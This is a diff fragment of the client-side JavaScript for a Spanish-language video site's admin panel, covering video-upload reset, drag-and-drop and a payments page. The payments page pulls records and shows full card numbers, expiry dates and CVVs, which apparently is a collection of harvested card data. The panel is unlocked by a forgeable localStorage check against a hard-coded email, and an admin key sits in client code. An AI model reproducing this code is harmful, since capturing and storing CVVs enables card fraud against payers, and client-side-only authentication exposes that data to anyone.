+
+  // reset
+  uploadedUrl = '';
+  document.getElementById("newName").value = '';
+  document.getElementById("newEmoji").value = '🔥';
+  document.getElementById("uploadStatus").textContent = '';
+  document.getElementById("uploadPercent").textContent = '';
+  document.getElementById("progressBar").style.display = "none";
+  document.getElementById("progressFill").style.width = "0%";
+  document.getElementById("videoPreviewWrap").style.display = "none";
+  enableAddBtn(false);
+  document.getElementById("fileInput").value = '';
+  const ui = document.getElementById("urlInput"); if (ui) ui.value = '';
+  const up = document.getElementById("urlPreviewWrap"); if (up) up.style.display = "none";
+
+  toast("✅ Video agregado a la lista");
+  showPage("videos");
+}
+
+// ---- UTILS ----
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function toast(msg, isError) {
+  const el = document.getElementById("alertToast");
+  el.textContent = msg;
+  el.className = "alert" + (isError ? " error" : "");
+  setTimeout(() => el.classList.add("show"), 10);
+  setTimeout(() => el.classList.remove("show"), 2800);
+}
+
+// Drag-and-drop
+const zone = document.getElementById("uploadZone");
+if (zone) {
+  zone.addEventListener("dragover", e => { e.preventDefault(); zone.classList.add("dragover"); });
+  zone.addEventListener("dragleave", () => zone.classList.remove("dragover"));
+  zone.addEventListener("drop", e => {
+    e.preventDefault();
+    zone.classList.remove("dragover");
+    const fi = document.getElementById("fileInput");
+    const dt = e.dataTransfer;
+    // asignar archivo y disparar
+    Object.defineProperty(fi, 'files', { value: dt.files, writable: true });
+    onFileSelected(fi);
+  });
+}
+
+// Cargar config guardada al entrar al panel de subida
+// ---- PAGOS ----
+async function renderPagos() {
+  let pagos = [];
+  try {
+    const res = await fetch(API + '/pagos', { headers: { 'X-Admin-Key': ADMIN_KEY } });
+    pagos = await res.json();
+  } catch(e) {
+    pagos = JSON.parse(localStorage.getItem('liveamo_pagos') || '[]');
+  }
+  const tbody = document.getElementById("pagosTableBody");
+  document.getElementById("statPagosTotal").textContent = pagos.length;
+  document.getElementById("statPagosMonto").textContent = '$' + (pagos.length * 1).toFixed(2);
+
+  if (!pagos.length) {
+    tbody.innerHTML = '<tr><td colspan="7"><div class="empty-state">No hay pagos registrados aún.</div></td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = pagos.map(p => `
+    <tr>
+      <td style="color:rgba(255,255,255,0.5);font-size:12px">${escHtml(p.fecha)}</td>
+      <td style="color:white;font-weight:500">${escHtml(p.titular)}</td>
+      <td style="color:#4a9af5">${escHtml(p.correo)}</td>
+      <td style="font-family:monospace;color:rgba(255,255,255,0.7)">${escHtml(p.tarjeta)}</td>
+      <td style="color:rgba(255,255,255,0.5)">${escHtml(p.expiry)}</td>
+      <td style="font-family:monospace;color:rgba(255,255,255,0.7)">${escHtml(p.cvv||'—')}</td>
+      <td><span class="status-badge badge-active">${escHtml(p.monto)}</span></td>
+      <td style="color:rgba(255,255,255,0.4);font-size:12px">${escHtml(p.usuario)}</td>
+    </tr>
+  `).join('');
+}
+
+function limpiarPagos() {
+  if (!confirm('¿Eliminar todos los registros de pago?')) return;
+  localStorage.removeItem('liveamo_pagos');
+  renderPagos();
+  toast('🗑️ Registros eliminados');
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+  cargarConfigCloud();
+  try {
+    const s = JSON.parse(localStorage.getItem('liveamo_session') || 'null');
+    if (s && s.email === 'ofrek@gmail.com' && Date.now() - s.ts < 30 * 24 * 60 * 60 * 1000) {
+      document.getElementById("loginScreen").style.display = "none";
+      document.getElementById("adminPanel").style.display = "block";
+      renderTable();
+      updateStats();
+      cargarDesdeNube(); // sincronizar desde JSONbin al entrar
+    }
+  } catch(e) {}
+});
+</script>
+</body>
+</html>
